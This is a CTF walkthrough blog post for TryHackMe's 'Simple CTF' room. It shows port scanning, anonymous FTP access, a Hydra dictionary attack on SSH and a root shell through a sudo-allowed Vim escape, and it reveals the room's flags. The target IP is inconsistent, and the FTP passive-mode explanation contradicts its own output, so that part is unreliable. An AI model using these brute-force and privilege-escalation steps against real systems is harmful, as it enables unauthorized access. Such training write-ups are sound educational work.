@@ -1,0 +1,338 @@
+---
+title: "TryHackMe Writeup: Simple CTF"
+author: Guru Brian
+pubDatetime: 2026-08-22T18:23:01.000Z
+slug: 
+featured: false
+tags:
+  - TryHackMe
+  - CTF
+  - FTP
+  - Hydra
+  - Privilege Escalation
+  - Vim
+description: "A comprehensive walkthrough for TryHackMe's Simple CTF room. Learn how to troubleshoot FTP passive modes, brute-force SSH on non-standard ports, and escalate privileges using Vim."
+hideEditPost: false
+---
+
+Welcome to another TryHackMe writeup! In this walkthrough, we will tackle a boot-to-root machine that tests a variety of foundational penetration testing skills. 
+
+We will start by enumerating multiple services across standard and non-standard ports, analyzing `robots.txt`, and hunting for vulnerabilities using SearchSploit. Along the way, we will encounter a common real-world networking issue—hanging FTP connections—and learn how to troubleshoot it by falling back to legacy passive modes. Finally, we will brute-force our way into the system and leverage a classic `sudo` misconfiguration with Vim to achieve root access.
+
+Let's jump in!
+
+![Free Classic wooden desk with writing materials](https://images.pexels.com/photos/159618/still-life-school-retro-ink-159618.jpeg?auto=compress\&cs=tinysrgb\&w=1260\&h=750\&dpr=1)
+*Photo by [Pixabay](https://www.pexels.com/photo/brown-wooden-desk-159618/)*
+
+## Table of contents
+
+## Initial Reconnaissance
+
+Starting with our target IP address, we initiate a comprehensive `nmap` scan to identify open ports and running services.
+
+```bash
+┌──(shellbug㉿Ellipsis)-[~]
+└─$ nmap -p- -sC -sV 10.10.10.30 -T5 -vv
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-08 18:30 EAT
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.00s elapsed
+Initiating Ping Scan at 18:30
+Scanning 10.10.10.30 [4 ports]
+Completed Ping Scan at 18:30, 0.24s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:30
+Completed Parallel DNS resolution of 1 host. at 18:30, 0.00s elapsed
+Initiating SYN Stealth Scan at 18:30
+Scanning 10.10.10.30 [65535 ports]
+Discovered open port 21/tcp on 10.10.10.30
+Discovered open port 80/tcp on 10.10.10.30
+SYN Stealth Scan Timing: About 6.67% done; ETC: 18:38 (0:07:14 remaining)
+SYN Stealth Scan Timing: About 17.29% done; ETC: 18:36 (0:04:52 remaining)
+SYN Stealth Scan Timing: About 26.22% done; ETC: 18:36 (0:04:16 remaining)
+Discovered open port 2222/tcp on 10.10.10.30
+Discovered open port 2222/tcp on 10.10.10.30
+SYN Stealth Scan Timing: About 23.89% done; ETC: 18:39 (0:06:25 remaining)
+SYN Stealth Scan Timing: About 30.20% done; ETC: 18:39 (0:05:49 remaining)
+SYN Stealth Scan Timing: About 35.99% done; ETC: 18:39 (0:05:22 remaining)
+SYN Stealth Scan Timing: About 42.77% done; ETC: 18:39 (0:04:42 remaining)
+SYN Stealth Scan Timing: About 48.65% done; ETC: 18:39 (0:04:14 remaining)
+SYN Stealth Scan Timing: About 56.98% done; ETC: 18:38 (0:03:25 remaining)
+SYN Stealth Scan Timing: About 65.93% done; ETC: 18:38 (0:02:36 remaining)
+SYN Stealth Scan Timing: About 75.59% done; ETC: 18:38 (0:01:47 remaining)
+SYN Stealth Scan Timing: About 86.72% done; ETC: 18:37 (0:00:55 remaining)
+Completed SYN Stealth Scan at 18:37, 407.25s elapsed (65535 total ports)
+Initiating Service scan at 18:37
+Scanning 3 services on 10.10.10.30
+Completed Service scan at 18:37, 6.47s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.30.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:37
+NSE: [ftp-bounce 10.10.10.30:21] PORT response: 500 Illegal PORT command.
+NSE Timing: About 99.77% done; ETC: 18:38 (0:00:00 remaining)
+Completed NSE at 18:38, 31.65s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:38
+Completed NSE at 18:38, 1.43s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:38
+Completed NSE at 18:38, 0.00s elapsed
+Nmap scan report for 10.10.10.30
+Host is up, received echo-reply ttl 62 (0.20s latency).
+Scanned at 2025-08-08 18:30:50 EAT for 447s
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.21.31.252
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries
+|_/ /openemr-5_0_1_3
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
+|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:38
+Completed NSE at 18:38, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:38
+Completed NSE at 18:38, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:38
+Completed NSE at 18:38, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 447.58 seconds
+           Raw packets sent: 196878 (8.663MB) | Rcvd: 280 (12.304KB)
+```
+
+From the results, we have three open ports: 21 (FTP), 80 (HTTP), and 2222 (SSH). Let's break down our enumeration strategy for each one.
+
+
+## Service Enumeration
+
+***Port 21: FTP (vsFTPd 3.0.3)***
+
+Our scan shows vsFTPd 3.0.3 is running, and crucially, Anonymous FTP login is allowed. Before connecting, a quick check on searchsploit shows a known Remote Denial of Service vulnerability (CVE-2021-30047), but no RCEs.
+
+```bash
+❯ searchsploit vsFTPd 3.0.3
+------------------------------------------------------------------------- -------------------------
+ Exploit Title                                                           |  Path
+------------------------------------------------------------------------- -------------------------
+vsftpd 3.0.3 - Remote Denial of Service                                  | multiple/remote/49719.py
+------------------------------------------------------------------------- -------------------------
+```
+
+***Port 80: HTTP (Apache 2.4.18)***
+
+The web server displays the default Apache Ubuntu page. However, our Nmap scan caught a robots.txt file with two disallowed entries.
+
+```bash
+User-agent: *
+Disallow: /
+Disallow: /openemr-5_0_1_3
+```
+
+Checking Exploit-DB for OpenEMR 5.0.1.3 reveals an authenticated Remote Code Execution exploit:
+
+```bash
+❯ searchsploit openemr 5_0_1_3
+------------------------------------------------------------------------- -------------------------
+ Exploit Title                                                           |  Path
+------------------------------------------------------------------------- -------------------------
+OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                  | php/webapps/45161.py
+------------------------------------------------------------------------- -------------------------
+```
+
+We also run a gobuster scan in the background to ensure we don't miss anything else:
+
+```bash
+❯ gobuster dir -u http://10.10.218.215 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 64
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.218.215
+[+] Method:                  GET
+[+] Threads:                 64
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/simple               (Status: 301) [Size: 315] [--> http://10.10.218.215/simple/]
+Progress: 87664 / 87665 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+***Port 2222: SSH (OpenSSH 7.2p2)***
+
+A quick inspection reveals OpenSSH 7.2p2 is running. This specific version is vulnerable to Username Enumeration (CVE-2016-6210).
+
+> [!NOTE]
+> ***How OpenSSH 7.2p2 Username Enumeration Works***:
+> This vulnerability allows remote attackers to determine valid usernames on a target system by exploiting a timing side-channel during SSH authentication. When OpenSSH is configured to use SHA256 or SHA512 for password hashing, it behaves differently depending on whether the username exists:
+    - If the username exists: OpenSSH performs a full password hash comparison.
+    - If the username does not exist: OpenSSH uses a static Blowfish hash on a dummy password.
+> A valid username takes longer to process due to real password hashing. By sending massive dummy passwords (e.g., 50,000 bytes) and measuring response times, an attacker can reliably infer whether a username is valid.
+
+## FTP Anonymous Login & Troubleshooting
+
+Returning to the low-hanging fruit, we log into the FTP server anonymously. However, when we try to execute an ls command, the prompt hangs indefinitely and times out.
+
+```bash
+❯ ftp 10.10.218.215 21
+Connected to 10.10.218.215.
+220 (vsFTPd 3.0.3)
+Name (10.10.218.215:blackhurts): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||49421|)
+^C
+receive aborted. Waiting for remote to finish abort.
+```
+
+Notice the message: 229 Entering Extended Passive Mode (|||49421|).
+
+> [!INFO]
+> ***Extended Passive Mode (EPSV)***:
+> EPSV is a modern enhancement of classic Passive Mode designed to simplify FTP operations over both IPv4 and IPv6. Instead of providing the client with both an IP address and a port, the server only communicates the port number, assuming the client will connect back to the same IP used for the control connection.
+
+
+Sometimes EPSV causes problems, such as hanging on directory listings, usually due to firewall restrictions blocking the data port that EPSV specifies. To fix this, we switch our FTP client to use classic Passive Mode (PASV) by issuing the passive command.
+
+```bash
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> ls -a
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
+drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+ftp> cd pub
+ftp> get ForMitch.txt
+```
+
+> \[!SUCCESS]
+> We download ForMitch.txt and read its contents:
+
+```text
+Dammit man... you're the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+```
+
+We now have a valid username (mitch) and a massive hint that his password is weak.
+
+## SSH Brute-Forcing & Initial Access
+
+We cannot log into FTP as Mitch (it is restricted to anonymous only), so we pivot our attack to the SSH service on port 2222. Using Hydra, we run a dictionary attack against Mitch's account using the rockyou.txt wordlist.
+
+```bash
+❯ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.218.215:2222
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-09 07:41:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.218.215:2222/
+[2222][ssh] host: 10.10.218.215   login: mitch   password: secret
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-09 07:41:56
+```
+
+The password is impressively weak: secret. We use it to SSH into the machine and grab the user flag.
+
+```bash
+❯ ssh mitch@10.10.218.215 -p 2222
+mitch@10.10.218.215's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+$ cat user.txt
+G00d j0b, keep up!
+```
+
+We can also see another user:
+```bash
+$ cd ..
+$ ls
+mitch  sunbath
+```
+
+
+## Privilege Escalation
+
+Checking our sudo privileges is always a priority upon gaining initial access.
+
+```bash
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+We can run the vim text editor as root without supplying a password. Checking GTFOBins, we find that if Vim is allowed to run as superuser by sudo, it does not drop its elevated privileges. We can use it to spawn a root shell directly from within the editor.
+
+We execute the following command:
+
+```bash
+$ sudo vim -c ':!/bin/sh'
+```
+
+Instantly, we are dropped into a root shell!
+
+```bash
+# cd /root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. #######!
+```
+
+***Conclusion***
+> \[!SUCCESS]
+> Hurray, we have all the flags!
+
+But wait a minute—we left several attack vectors entirely unused. We found a /simple directory (likely hosting CMS Made Simple, vulnerable to SQL injection) and an OpenSSH version vulnerable to User Enumeration.
+
+In this scenario, FTP and SSH brute-forcing provided the path of least resistance, but I highly encourage you to go back and try to exploit those alternative vectors for initial access as an extra challenge!
+
